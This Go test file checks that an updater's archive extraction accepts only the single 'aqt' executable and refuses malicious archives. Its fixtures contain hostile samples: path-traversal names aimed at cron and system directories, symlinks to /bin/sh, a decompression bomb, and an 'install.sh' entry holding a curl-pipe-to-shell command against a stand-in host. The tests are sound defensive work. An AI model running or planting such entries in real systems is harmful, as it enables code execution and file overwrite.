package update

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// archiveEntry is one member of a fixture archive. The fields mirror what a real
// tar or zip header carries, so a test can build the exact shape it wants to be
// refused.
type archiveEntry struct {
	name     string
	body     string
	typeflag byte   // tar only; 0 means tar.TypeReg
	mode     uint32 // 0 means 0755
	link     string
}

func tarGz(t *testing.T, entries ...archiveEntry) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for _, e := range entries {
		flag := e.typeflag
		if flag == 0 {
			flag = tar.TypeReg
		}
		mode := e.mode
		if mode == 0 {
			mode = 0o755
		}
		h := &tar.Header{
			Name:     e.name,
			Typeflag: flag,
			Mode:     int64(mode),
			Linkname: e.link,
		}
		if flag == tar.TypeReg {
			h.Size = int64(len(e.body))
		}
		if err := tw.WriteHeader(h); err != nil {
			t.Fatal(err)
		}
		if flag == tar.TypeReg {
			if _, err := tw.Write([]byte(e.body)); err != nil {
				t.Fatal(err)
			}
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func zipArchive(t *testing.T, entries ...archiveEntry) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, e := range entries {
		mode := os.FileMode(0o755)
		if e.mode != 0 {
			mode = os.FileMode(e.mode)
		}
		h := &zip.FileHeader{Name: e.name, Method: zip.Deflate}
		h.SetMode(mode)
		w, err := zw.CreateHeader(h)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write([]byte(e.body)); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// The two shapes a release archive comes in: a tar.gz carrying `aqt` everywhere
// but Windows, where it is a zip carrying `aqt.exe`.
var (
	tarGzPlatform = Platform{OS: "linux", Arch: "amd64"}
	zipPlatform   = Platform{OS: "windows", Arch: "amd64"}
)

// writeArchive puts fixture bytes on disk. The name is for a reader of a failing
// test; extraction takes the format from the platform, not from this.
func writeArchive(t *testing.T, name string, data []byte) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestExtractAcceptsTheReleaseArchive(t *testing.T) {
	archive := writeArchive(t, "aqt.tar.gz", tarGz(t, archiveEntry{name: "aqt", body: "binary"}))
	dst := filepath.Join(t.TempDir(), "out")

	if err := ExtractExecutable(archive, tarGzPlatform, dst); err != nil {
		t.Fatalf("ExtractExecutable: %v", err)
	}
	got, err := os.ReadFile(dst)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != "binary" {
		t.Fatalf("extracted %q", got)
	}
}

func TestExtractAcceptsTheWindowsReleaseArchive(t *testing.T) {
	archive := writeArchive(t, "aqt.zip", zipArchive(t, archiveEntry{name: "aqt.exe", body: "binary"}))
	dst := filepath.Join(t.TempDir(), "out")

	if err := ExtractExecutable(archive, zipPlatform, dst); err != nil {
		t.Fatalf("ExtractExecutable: %v", err)
	}
	got, err := os.ReadFile(dst)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != "binary" {
		t.Fatalf("extracted %q", got)
	}
}

// Every one of these is a way an archive could try to place a file somewhere other
// than the one path the caller named, or to be something other than a binary.
// Requiring an exact name match is what makes the traversal cases fall out.
func TestExtractRefusesAnythingButTheExecutable(t *testing.T) {
	cases := []struct {
		name    string
		entries []archiveEntry
		want    error
	}{
		{
			name:    "parent traversal",
			entries: []archiveEntry{{name: "../../etc/cron.d/x", body: "x"}},
			want:    ErrUnexpectedEntry,
		},
		{
			name:    "absolute path",
			entries: []archiveEntry{{name: "/usr/local/bin/aqt", body: "x"}},
			want:    ErrUnexpectedEntry,
		},
		{
			name:    "nested under a directory",
			entries: []archiveEntry{{name: "bin/aqt", body: "x"}},
			want:    ErrUnexpectedEntry,
		},
		{
			name:    "windows separator",
			entries: []archiveEntry{{name: `..\..\aqt`, body: "x"}},
			want:    ErrUnexpectedEntry,
		},
		{
			name:    "symlink",
			entries: []archiveEntry{{name: "aqt", typeflag: tar.TypeSymlink, link: "/bin/sh"}},
			want:    ErrUnexpectedEntry,
		},
		{
			name:    "hard link",
			entries: []archiveEntry{{name: "aqt", typeflag: tar.TypeLink, link: "/bin/sh"}},
			want:    ErrUnexpectedEntry,
		},
		{
			name:    "character device",
			entries: []archiveEntry{{name: "aqt", typeflag: tar.TypeChar}},
			want:    ErrUnexpectedEntry,
		},
		{
			name:    "directory",
			entries: []archiveEntry{{name: "aqt", typeflag: tar.TypeDir}},
			want:    ErrUnexpectedEntry,
		},
		{
			name: "the executable twice",
			entries: []archiveEntry{
				{name: "aqt", body: "first"},
				{name: "aqt", body: "second"},
			},
			want: ErrUnexpectedEntry,
		},
		{
			name: "an extra payload beside it",
			entries: []archiveEntry{
				{name: "aqt", body: "binary"},
				{name: "install.sh", body: "curl evil | sh"},
			},
			want: ErrUnexpectedEntry,
		},
		{
			name:    "the server binary instead",
			entries: []archiveEntry{{name: "aqt-server", body: "binary"}},
			want:    ErrUnexpectedEntry,
		},
		{
			name:    "nothing at all",
			entries: nil,
			want:    ErrMissingExecutable,
		},
		{
			name:    "an empty executable",
			entries: []archiveEntry{{name: "aqt", body: ""}},
			want:    ErrMissingExecutable,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			archive := writeArchive(t, "aqt.tar.gz", tarGz(t, tc.entries...))
			dst := filepath.Join(t.TempDir(), "out")

			err := ExtractExecutable(archive, tarGzPlatform, dst)
			if !errors.Is(err, tc.want) {
				t.Fatalf("got %v, want %v", err, tc.want)
			}
		})
	}
}

// A zip carrying a symlink records it in the mode bits, which is what the release
// archives would carry if one were ever smuggled in.
func TestExtractRefusesANonRegularZipEntry(t *testing.T) {
	entry := archiveEntry{name: "aqt.exe", body: "/bin/sh", mode: uint32(os.ModeSymlink | 0o777)}
	archive := writeArchive(t, "aqt.zip", zipArchive(t, entry))
	dst := filepath.Join(t.TempDir(), "out")

	if err := ExtractExecutable(archive, zipPlatform, dst); !errors.Is(err, ErrUnexpectedEntry) {
		t.Fatalf("got %v, want ErrUnexpectedEntry", err)
	}
}

// A gzip stream that expands far beyond its compressed size is bounded by the
// output cap, not read to completion first.
func TestExtractRefusesADecompressionBomb(t *testing.T) {
	// Shrink the cap rather than build a 256 MiB bomb to cross it: what is under
	// test is that the copy stops at the cap, which is the same assertion at any
	// cap, and the real one costs ~15s here under -race.
	orig := maxExecutableBytes
	t.Cleanup(func() { maxExecutableBytes = orig })
	maxExecutableBytes = 4 << 10

	bomb := archiveEntry{name: "aqt", body: strings.Repeat("\x00", int(maxExecutableBytes)+1)}
	archive := writeArchive(t, "aqt.tar.gz", tarGz(t, bomb))
	dst := filepath.Join(t.TempDir(), "out")

	if err := ExtractExecutable(archive, tarGzPlatform, dst); !errors.Is(err, ErrArchiveTooLarge) {
		t.Fatalf("got %v, want ErrArchiveTooLarge", err)
	}
}

func TestExecutableNameIsPlatformSpecific(t *testing.T) {
	if got := ExecutableName(Platform{OS: "windows", Arch: "amd64"}); got != "aqt.exe" {
		t.Fatalf("windows name = %q", got)
	}
	for _, p := range Platforms {
		if p.OS == "windows" {
			continue
		}
		if got := ExecutableName(p); got != "aqt" {
			t.Fatalf("%s name = %q", p, got)
		}
	}
}
